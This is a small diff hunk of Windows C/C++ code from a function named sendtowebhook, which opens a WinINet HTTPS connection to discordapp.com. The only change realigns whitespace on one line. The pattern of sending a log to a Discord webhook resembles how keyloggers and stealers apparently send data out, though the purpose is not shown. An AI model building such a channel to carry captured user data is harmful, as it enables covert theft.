@@ -23,7 +23,7 @@ int sendtowebhook(const char* log) {
 
     HINTERNET hConnect = InternetConnectW(
         hSession,                     // Use InternetOpenW Handle
-        L"discordapp.com",               // Internet Server Hostname
+        L"discordapp.com",            // Internet Server Hostname
         INTERNET_DEFAULT_HTTPS_PORT,  // HTTPS Port
         NULL,                         // No need for Username
         NULL,                         // No need for Password
